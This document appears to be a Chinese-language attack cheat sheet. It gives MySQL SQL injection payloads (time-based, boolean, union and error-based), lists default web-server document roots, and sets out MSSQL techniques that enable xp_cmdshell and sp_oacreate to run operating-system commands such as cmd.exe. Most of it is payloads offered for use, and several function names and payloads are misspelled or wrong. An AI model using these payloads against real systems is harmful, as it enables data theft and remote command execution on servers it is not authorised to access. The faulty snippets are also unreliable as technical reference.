# SQL注入

能用SQLmap就SQLmap，手注入😂

**Mysql为例**

```
Mysql元数据库information_schema
                        |
                        `—— tables
                        |      |
                        |      `—— table_name (所有表名)
                        |      |
                        |      `—— table_schema (表所在的库)
                        |
                        `—— columns
                        |
                        `—— columns (所有字段)
                        |
                        `—— table_name (字段所在的表)
                        |
                        `—— table_schema (字段所存在的库)
```

**Mysql常用函数**

```mysql
version() mysql当前数据库版本
Database() 当前数据库名
user () 用户名
current_user () 当前用户名
system_user () 系统用户名
@@basedir 数据库路径
@@datadir 数据文件路径
@@versoin_compile_os 操作系统版本

length() 返回字符串长度

subsring() 截取字符串
substr() 
mind ()                     —————参数：
                                   1.截取的字符串
                                   2.截取起始位置，从1开始计数
                                   3.截取长度

left() 从左侧取字符串个数
concat() 没有分隔符连接字符串
concat_ws() 有分隔符连接字符串
group_concat() 不同行的内容返回在同一行

ord() 返回ASCII码
ascii() 

hex() 转换十六进制
unhex() hex反向操作
md5() 返回md5值
floor(x) 返回不大于x的最大整数
round(x) 返回参数x接近的整数
rand() 返回0-1之间的随机浮点数

load_file() 读取文件，并返回文件内容作为字符串

sleep() 指定睡眠时间
if(True,t,f) 如果是True执行t否则执行f
find_in_set() 返回字符串在字符列表中的位置
benchmark() 指定语句执行的次数
name_const() 返回表作为结果
```

## 注入类型

- **sql注入延迟注入**

```mysql
判断是否存在延迟注入 ▼
                and sleep(5)
如果存在返回时间将会延迟5s
数据库名称长度payload：
and if(length(database())=$,sleep(5),1)--+  $为长度数值
数据库名payload：
and if(substr(database(),$,1)='a',sleep(5),1)--+  $为长度数值 a为名称中的字符
```

- **sql注入布尔注入**

```mysql
延迟型和布尔型payload核心部分的构造相同
判断是否存在延时注入 ▼
        and length(database())=0
数据库名称长度payload：
and length(database())=0--+
数据库名称名称payload：
and length(database(),$,1)='a'--+ $为长度数值 a为名称中的字符
联合查询union方法
数据库名称名称payload：
union select 1,database()--+
```

- **sql注入报错注入**

```mysql
extractvalue() 方法
数据库名称名称payload：
and extractvalue(1,concat(0x7e,(select database()))) --+ 库名称
updatexml()类似extractvalue() 方法
```





## 



## 扩展

```
winserver的iis默认路径c:\Inetpub\wwwroot
linux的nginx一般是/usr/local/nginx/html，/home/wwwroot/default，/usr/share/nginx，/var/www/htm等
apache 就.../var/www/htm，.../var/www/html/htdocs
phpstudy 就是...\PhpStudy20180211\PHPTutorial\WWW\
xammp 就是...\xampp\htdocs
```

# 攻击Mssql数据库命令执行总结

## xp_cmdshell利用

**前提条件：**

- Mssql数据库服务未降权
- 已获取到数据库密码

xp_cmdshell是Sql Server中的一个组件，我们可以用它来执行系统命令

### **判断xp_cmdshell状态**

我们可以在master.dbo.sysobjects中查看xp_cmdshell状态

```mssql
select * from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell'
```

只用判断存在，利用count(*)即可。

```mssql
select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell'
```

存在即返回1

### **启用xp_cmdshell**

我们可以利用EXEC启用xp_cmdshell

```mssql
EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;
```

### **利用xp_cmdshell执行命令**

通过xp_cmdshell执行系统命令指令如下

```mssql
exec master..xp_cmdshell 'whoami'
```

### **恢复被删除的xp_cmdshell**

我们可以利用xplog70.dll恢复被删除的xp_cmdshell

```mssql
Exec master.dbo.sp_addextendedproc 'xp_cmdshell','D:\\xplog70.dll'
```

## **COM组件利用**

前提条件：

- Mssql数据库服务未降权
- 已获取到数据库密码

我们可以借助Sql Server中的COM组件SP_OACREATE来执行系统命令。

### **判断SP_OACREATE状态**

我们可以在master.dbo.sysobjects中查看SP_OACREATE状态

```mssql
select * from master.dbo.sysobjects where xtype='x' and name='SP_OACREATE'
```

只用判断存在，利用count(*)即可

```mssql
select count(*) from master.dbo.sysobjects where xtype='x' and name='SP_OACREATE'
```

存在即返回1

### **启用SP_OACREATE**

利用EXEC启用SP_OACREATE

```mssql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE WITH OVERRIDE;
EXEC sp_configure 'Ole Automation Procedures', 1;
RECONFIGURE WITH OVERRIDE;
```

### **利用SP_OACREATE执行命令**

通过SP_OACREATE执行系统命令指令如下

```mssql
declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c whoami >c:\\1.txt'
```